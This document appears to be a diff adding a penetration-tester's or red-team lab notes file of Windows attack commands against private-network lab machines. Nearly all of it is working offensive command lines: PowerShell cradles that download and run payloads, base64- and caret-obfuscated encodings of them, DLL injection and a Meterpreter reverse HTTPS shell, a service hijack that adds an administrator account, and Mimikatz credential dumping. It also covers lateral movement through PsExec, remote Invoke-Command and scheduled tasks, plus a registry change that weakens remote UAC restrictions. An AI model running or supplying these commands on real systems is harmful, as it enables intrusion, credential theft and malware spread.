@@ -1,0 +1,132 @@
+Use Case 1: From a fully patched machine and from a non-user account,show how a click or a word macro can get you infected
+powershell.exe -ExecutionPolicy bypass –noprofile –c (New-Object System.Net.WebClient).DownloadFile('http://172.16.60.124/myLove.exe', \"$env:temp\myLove.exe\"); Start-Process \"$env:temp\myLove.exe\"
+migrate to explorer manually
+
+Use Case 2: Do all of above in one stroke (an a bit of obfuscation with concatenation)
+powershell.exe -ExecutionPolicy bypass –noprofile –c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1');(New-Object System.Net.WebClient).DownloadFile('http://172.16.60.124/calc.dll', \"$env:temp\"+'\calc.dll');Invoke-DllInjection -ProcessID (get-process -name explorer | select -ExpandProperty Id) -dll $env:temp\\calc.dll"
+
+Use Case 3: Obfuscation Encode 64
+powershell.exe -ExecuTionPolicy ByPass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADYAMAAuADEAMgA0AC8AYwBhAGwAYwAuAGUAeABlACcALAAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFwAYwBhAGwAYwAuAGUAeABlACIAKQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGMAYQBsAGMALgBlAHgAZQAiAA==
+And encode with carrets
+powershell.exe -ExecuTionPolicy ByPass ^-^e^Nco^De KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADYAMAAuADEAMgA0AC8AYwBhAGwAYwAuAGUAeABlACcALAAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFwAYwBhAGwAYwAuAGUAeABlACIAKQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGMAYQBsAGMALgBlAHgAZQAiAA==
+
+
+  
+Test command:
+powershell.exe -ExecuTionPolicy ByPass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADYAMAAuADEAMgA0AC8AYwBhAGwAYwAuAGUAeABlACcALAAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFwAYwBhAGwAYwAuAGUAeABlACIAKQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGMAYQBsAGMALgBlAHgAZQAiAA==
+
+Use Cases:
+powershell.exe -ExecutionPolicy bypass –noprofile –c (New-Object System.Net.WebClient).DownloadFile('http://172.16.60.124/myLove.exe', \"$env:temp\myLove.exe\"); Start-Process \"$env:temp\myLove.exe\"
+
+
+IMPRESONATE
+powershell.exe -ExecutionPolicy bypass –noprofile –c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1');(New-Object System.Net.WebClient).DownloadFile('http://172.16.60.124/calc.dll', \"$env:temp\"+'\calc.dll');Invoke-DllInjection -ProcessID (get-process -name explorer | select -ExpandProperty Id) -dll $env:temp\\calc.dll"
+
+powershell.exe -ExecuTionPolicy ByPass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADYAMAAuADEAMgA0AC8AYwBhAGwAYwAuAGUAeABlACcALAAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFwAYwBhAGwAYwAuAGUAeABlACIAKQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGMAYQBsAGMALgBlAHgAZQAiAA==
+
+ENCODED AND OBFUSCATED
+powershell.exe -ExecuTionPolicy ByPass ^-^e^Nco^De KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADYAMAAuADEAMgA0AC8AYwBhAGwAYwAuAGUAeABlACcALAAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFwAYwBhAGwAYwAuAGUAeABlACIAKQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGMAYQBsAGMALgBlAHgAZQAiAA==
+
+SSL (from the WIN 64 machine:
+powershell.exe -c iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1'); Invoke-Shellcode -ProcessID (Get-Process -Name explorer).Id -Payload windows/meterpreter/reverse_https -Lhost 172.16.60.124 -lport 443 -Force
+
+
+Command to create a malformed service:
+sc config myCompanyservice binpath= "net user Michael Passw0rd! /add"
+sc stop myCompanyservice
+sc start myCompanyservice
+
+sc config myCompanyservice binpath= "net localgroup Administrators Michael /add"
+sc stop myCompanyservice
+
+Mimikatz type 1
+privilege::debug
+token::whoami
+token::elevate
+lsadump::sam
+
+Mimikatz type 2
+powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
+
+
+==================================================================== Lateral Movement
+
+starting from a compromized machine:
+
+- getsystem
+- to dump the clear text passwords using powershell and mimikatz
+execute -c -H -f "powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+
+- run the backdoor file to other machines using psexec. PsExec will do the file transfer + wil lexecuted the transfered file as a aprocess
+
+
+execute -c -H -f "C:\psexec \\\\WIN7,IE11WIN8_1 -u IEUser -p Passw0rd! /accepteula -d -c -f C:\\myLove2.exe"
+
+
+
+=========
+
+For this attack set Kali with this commands yo allow multiple exploited machines:
+set exitonsessions false
+exploit -j
+
+we will store it in a bat file
+powershell.exe -c "$RemoteComputers = @('172.16.60.101','172.16.60.203'); $username = 'IEUser'; $password = 'Passw0rd!'; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Invoke-Command -ComputerName $RemoteComputers -credential $cred -ScriptBlock {(New-Object System.Net.WebClient).DownloadFile('http://172.16.60.124/myLove.exe', 'love.exe'); ([WMICLASS]'\\localhost\ROOT\CIMV2:win32_process').Create('love.exe')}"
+
+cd c:\
+upload mybat.bat
+execute -H -c -f "C:\\mybat.bat"
+
+
+================================
+
+
+using scheduled tasks:
+
+1. created a hidden shared folder, and we uploaded our backdoor heir
+
+net share temp$=C:\shared2 /GRANT:Everyone,FULL
+
+
+SchTasks /Create /SC ONCE /TN "Lover" /TR "\\172.16.60.204\temp$\mylove2.exe" /ST 08:26 /s 172.16.60.203 /u IEUser /p Passw0rd!
+
+SchTasks /Create /SC ONCE /TN "Lover" /TR "\\172.16.60.204\temp$\mylove2.exe" /ST 08:26 /s 172.16.60.205 /u IEUser /p Passw0rd!
+
+schtasks /Run /s 172.16.60.203 /u IEUser /p Passw0rd! /TN Lover && schtasks /Run /s 172.16.60.205 /u IEUser /p Passw0rd! /TN Lover
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+=========================
+
+ref. in case windows account access issues:
+
+cd c:\Windows
+CACLS TASKS /E /G builtin\administrators:F
+cd c:\Windows\System32
+CACLS TASKS /E /G builtin\administrators:F
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+
+
